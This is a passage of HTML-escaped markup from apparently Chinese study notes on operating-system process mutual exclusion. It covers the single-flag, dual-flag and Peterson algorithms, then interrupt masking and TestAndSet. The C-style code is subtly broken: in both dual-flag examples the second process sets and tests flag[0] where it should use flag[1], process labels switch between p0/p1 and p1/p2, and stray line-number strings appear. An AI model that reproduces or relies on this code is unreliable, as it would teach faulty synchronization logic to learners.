其它处理&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;123456&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;1、空闲让进。 空的可以直接进去&lt;/p&gt;
&lt;p&gt;2、忙则等待。 繁忙不能进去&lt;/p&gt;
&lt;p&gt;3、有限等待。 不能让进程等待无限长时间&lt;/p&gt;
&lt;p&gt;4、让权等待。 不能进去，不要堵着&lt;/p&gt;
&lt;h3 id=&#34;23_2-进程互斥的软件实现方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_2-进程互斥的软件实现方法&#34;&gt;#&lt;/a&gt; 2.3_2 进程互斥的软件实现方法&lt;/h3&gt;
&lt;p&gt;1、单标志法&lt;/p&gt;
&lt;p&gt;两个进程在访问完临界区后会把使用临界区的权限教给另一个进程。也就是说每个进程进入临界区的权限只能被另一个进程赋予&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; turn &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//p0 进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;turn&lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;turn &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//p1 进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;turn&lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;turn &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1234567891011&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;可以实现互斥&lt;/p&gt;
&lt;p&gt;存在的问题：p1 要访问的话，必须 p0 先访问，违背：空闲让进原则&lt;/p&gt;
&lt;p&gt;2、双标志先检查&lt;/p&gt;
&lt;p&gt;算法思想：设置一个 bool 数组 flag [] 来标记自己是否想要进入临界区的意愿&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;bool&lt;/span&gt; flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//p1 进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//p2 进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;12345678910111213&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;主要问题：由于进程是并发进行的，可能会违背忙则等待的原则&lt;/p&gt;
&lt;p&gt;3、双标志后检查&lt;/p&gt;
&lt;p&gt;算法思想：设置一个 bool 数组 flag [] 来标记自己是否想要进入临界区的意愿，不过是先上锁后检查&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;bool&lt;/span&gt; flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//p1 进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//p2 进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;12345678910111213&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;主要问题：由于进程是并发进行的，可能会两个同时上锁，都进不去，违反空闲让进和有限等待原则&lt;/p&gt;
&lt;p&gt;会饥饿&lt;/p&gt;
&lt;p&gt;4、Peterson 算法&lt;/p&gt;
&lt;p&gt;主动让对方先使用处理器&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;bool&lt;/span&gt; flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; turn&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//p1 进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;turn&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;turn&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//p2 进程&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;turn&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;turn&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;critical section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;remainder section&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;12345678910111213141516&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;遵循空闲让进、忙则等待、有限等待三个原则&lt;/p&gt;
&lt;p&gt;但是未遵循让权等待的原则&lt;/p&gt;
&lt;h3 id=&#34;23_3-进程互斥的硬件实现方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_3-进程互斥的硬件实现方法&#34;&gt;#&lt;/a&gt; 2.3_3 进程互斥的硬件实现方法&lt;/h3&gt;
&lt;p&gt;1、中断屏蔽方法&lt;/p&gt;
&lt;p&gt;关中断（不允许进程中断）&lt;/p&gt;
&lt;p&gt;临界区&lt;/p&gt;
&lt;p&gt;开中断&lt;/p&gt;
&lt;p&gt;简单、高校&lt;/p&gt;
&lt;p&gt;多处理机，可能会同时访问临界资源&lt;/p&gt;
&lt;p&gt;使用 OS 内核进程&lt;/p&gt;
&lt;p&gt;2、TestAndSet（TSL 指令）&lt;/p&gt;
&lt;p&gt;TSL 是用硬件实现的，上锁、检查一气呵成&lt;/p&gt;
